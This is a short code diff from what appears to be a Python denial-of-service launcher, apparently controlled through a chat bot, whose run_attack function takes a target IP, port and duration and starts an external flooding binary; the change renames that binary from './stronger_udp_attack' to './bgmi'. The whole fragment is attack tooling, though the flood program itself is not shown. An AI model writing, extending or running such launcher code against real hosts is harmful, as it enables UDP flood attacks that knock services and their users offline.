@@ -69,7 +69,7 @@ def run_attack(target_ip, target_port, duration, chat_id):
         os.sched_setaffinity(pid, range(8))  # Restrict to CPUs 0-7
 
         # Prepare the attack command
-        attack_command = ['./stronger_udp_attack', target_ip, str(target_port), str(duration)]
+        attack_command = ['./bgmi', target_ip, str(target_port), str(duration)]
 
         # Start the attack
         process = subprocess.Popen(attack_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
